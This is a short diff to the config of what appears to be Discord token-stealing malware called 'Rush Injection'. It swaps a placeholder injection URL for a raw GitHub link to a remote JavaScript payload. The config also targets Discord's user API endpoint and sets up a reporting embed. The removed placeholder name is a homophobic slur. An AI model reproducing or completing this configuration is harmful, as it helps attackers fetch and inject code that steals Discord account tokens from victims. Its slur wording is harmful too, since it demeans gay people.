@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Rush Injection',
   embed_icon: 'https://media.discordapp.net/attachments/559513113645547521/1103871603282018414/Discord_Pfp_Red_Devil.gif?width=625&height=625'.replace(/ /g, '%20'),
   embed_color: 5639644,
-  injection_url: 'GAY_URL',
+  injection_url: 'https://raw.githubusercontent.com/Mask0ffice/donotrun/main/.github/YunoMiles.js',
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
